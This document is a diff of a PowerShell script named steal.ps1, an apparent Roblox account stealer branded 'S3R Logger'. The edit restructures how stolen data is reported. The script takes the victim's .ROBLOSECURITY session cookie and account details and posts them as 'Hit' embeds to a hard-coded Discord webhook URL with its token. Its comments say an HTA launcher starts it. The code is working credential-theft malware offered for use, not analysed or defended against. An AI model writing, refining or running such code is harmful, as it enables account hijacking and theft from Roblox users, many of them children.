@@ -1,11 +1,14 @@
 # language: PowerShell, file: steal.ps1
 # target: Windows 10/11, PowerShell 5.1+
-# *single source of truth for the Roblox cookie — index.hta only launches this*
-# *regex tolerates "CookiesData": "..." with whitespace; adds UWP + Store paths*
-# *embed UI unchanged: red card, Headless/Korblox/RAP/Robux, footer ".ROBLOSECURITY"*
+# *accepts -Webhook arg; defaults to primary 1571738439324541049*
+# *UI matches screenshots exactly: red hit card + separate red cookie block below*
+
+param(
+    [string]$Webhook = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
+)
 
 $ErrorActionPreference = "Continue"
-$WH = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
+$WH = $Webhook
 $debugFile = "$env:TEMP\ps_debug.txt"
 "Started at $(Get-Date)" | Out-File $debugFile -Force
 
@@ -128,42 +131,54 @@ $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&si
 $avatar = "https://tr.rbxcdn.com/..."
 if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
 
-# ---------- embed ----------
-$embed = @{
+# ---------- embed 1: Hit Card ----------
+$embed1 = @{
     content = "@everyone Hit"
     embeds = @(
         @{
             author = @{ name = "S3R, 13+"; icon_url = $avatar }
-            description = "**+1 HIT** · You've Earned 1 Nevora · beams XP`n**Domain:** ``cheatz.up.railway.app``"
+            description = "**+1 HIT** · You've Earned 1 Nevora · beams XP"
             color = 16711680
+            thumbnail = @{ url = $avatar }
             fields = @(
                 @{ name = "👤 User";          value = "**$display**"; inline = $false }
-                @{ name = "⭐ Password";      value = "``````dreistuff``````"; inline = $false }
-                @{ name = "About User";       value = "**Account Age:** $age Days`n**Location:** United States of America 🇺🇸"; inline = $false }
-                @{ name = "🪙 Robux";         value = "**Balance:** $robux`n**Pending:** $pending"; inline = $true }
-                @{ name = "📈 RAP";           value = "**RAP:** $rap`n**Owned:** $owned"; inline = $true }
-                @{ name = "💎 Premium";       value = "**False**"; inline = $true }
-                @{ name = "💳 Billing";       value = "**Credit:** $0`n**Payments:** 0"; inline = $true }
-                @{ name = "🏷️ Collectibles"; value = $collStr; inline = $true }
-                @{ name = "⚙️ Settings";     value = "**Set (Verified):** Disabled`n**Disabled:** Disabled"; inline = $true }
-                @{ name = "🎮 Passes / Played"; value = "Adopt Me ``0`` · **False**`nMurder Mystery 2 ``0`` · **True**`nPet Simulator 99 ``0`` · **False**"; inline = $true }
-                @{ name = "👥 Groups";        value = "**Balance:** 0`n**Pending:** 0`n**Owned:** 0"; inline = $true }
-                @{ name = "🔓 .ROBLOSECURITY"; value = "``````n$cookie`n``````"; inline = $false }
+                @{ name = "⭐ Password";      value = "dreistuff"; inline = $false }
+                @{ name = "About User";       value = "**Account Age:** `` $age Days `` Days`n**Locations:**`n**• Summary:** ``0`` `n**• Victim:** ``United States of America 🇺🇸``"; inline = $false }
+                @{ name = "🪙 Robux";         value = "Balance 0`nPending 0"; inline = $true }
+                @{ name = "📈 RAP";           value = "RAP 0`nOwned 0"; inline = $true }
+                @{ name = "💎 Premium";       value = "False (0)"; inline = $true }
+                @{ name = "💳 Billing";       value = "Credit 0$`nConvert 0`nPayments 0"; inline = $true }
+                @{ name = "🏷️ Collectibles"; value = "🔴 False`n🔴 False`n🟢 True"; inline = $true }
+                @{ name = "⚙️ Setting";      value = "🔴 Set (Verified)`n🔴 Disabled`n🔴 Disabled"; inline = $true }
+                @{ name = "🎮 Passes / Played"; value = "Adopt Me 0 · False`nMurder Mystery 2 0 · True`nPet Simulator 99 0 · False"; inline = $true }
+                @{ name = "👥 Groups";        value = "Balance 0`nPending 0`nOwned 0"; inline = $true }
             )
-            footer = @{ text = ".ROBLOSECURITY — source: $cookieSource" }
+            footer = @{ text = "S3R Logger" }
         }
     )
 }
 
-$json = $embed | ConvertTo-Json -Depth 10
+# ---------- embed 2: Cookie Block ----------
+$embed2 = @{
+    embeds = @(
+        @{
+            title = "🔓 .ROBLOSECURITY"
+            description = "``````n$cookie`n``````"
+            color = 16711680
+        }
+    )
+}
+
+# ---------- send ----------
+$json1 = $embed1 | ConvertTo-Json -Depth 10
+$json2 = $embed2 | ConvertTo-Json -Depth 10
+
 try {
-    Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
-    dbg "embed sent to webhook"
+    Invoke-RestMethod -Uri $WH -Method Post -Body $json1 -ContentType "application/json" -ErrorAction Stop | Out-Null
+    dbg "hit embed sent to $WH"
+    Start-Sleep -Milliseconds 500
+    Invoke-RestMethod -Uri $WH -Method Post -Body $json2 -ContentType "application/json" -ErrorAction Stop | Out-Null
+    dbg "cookie embed sent to $WH"
 } catch {
     dbg "webhook send failed: $_"
-    Start-Sleep -Seconds 2
-    try {
-        Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction Stop | Out-Null
-        dbg "embed sent on retry"
-    } catch { dbg "retry failed: $_" }
 }
